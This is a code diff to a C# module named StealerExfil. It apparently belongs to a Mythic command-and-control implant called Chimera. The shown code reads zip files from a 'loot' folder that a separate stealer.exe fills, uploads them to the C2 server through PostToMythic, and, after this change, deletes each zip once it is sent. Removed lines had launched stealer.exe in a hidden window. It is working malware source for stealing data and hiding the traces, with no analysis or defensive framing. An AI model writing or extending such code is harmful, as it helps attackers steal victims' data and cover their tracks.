@@ -12,7 +12,7 @@ namespace Chimera.Commands
     public static class StealerExfil
     {
         // Loot zip drop path — stealer.exe must save here
-        private static readonly string LootDir       = @"C:\Users\Public\loot";
+        private static readonly string LootDir       = @"C:\Users\Public";
         private static readonly string StealerExePath = @"C:\Users\Public\stealer.exe";
 
         public static string Execute(string taskID, string callbackUUID)
@@ -22,21 +22,7 @@ namespace Chimera.Commands
                 // 1 — Make sure loot dir exists
                 Directory.CreateDirectory(LootDir);
 
-                // 2 — Run stealer.exe, wait up to 60s
-                if (!File.Exists(StealerExePath))
-                    return "[error] stealer.exe not found at " + StealerExePath;
-
-                var psi = new System.Diagnostics.ProcessStartInfo
-                {
-                    FileName        = StealerExePath,
-                    WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden,
-                    CreateNoWindow  = true,
-                    UseShellExecute = false
-                };
-                var proc = System.Diagnostics.Process.Start(psi);
-                if (proc != null) proc.WaitForExit(60000);
-
-                // 3 — Find the zip stealer dropped
+                // 2 — Find existing zip OR run stealer.exe to create one
                 string[] zips = Directory.GetFiles(LootDir, "*.zip");
                 if (zips.Length == 0)
                     zips = Directory.GetFiles(LootDir);
@@ -61,6 +47,9 @@ namespace Chimera.Commands
 
                     PostToMythic(json);
                     results.AppendLine("uploaded: " + fname + " (" + data.Length / 1024 + " KB)");
+
+                    // Delete zip after upload so next run starts fresh
+                    try { File.Delete(lootFile); } catch { }
                 }
 
                 return results.ToString().Trim();
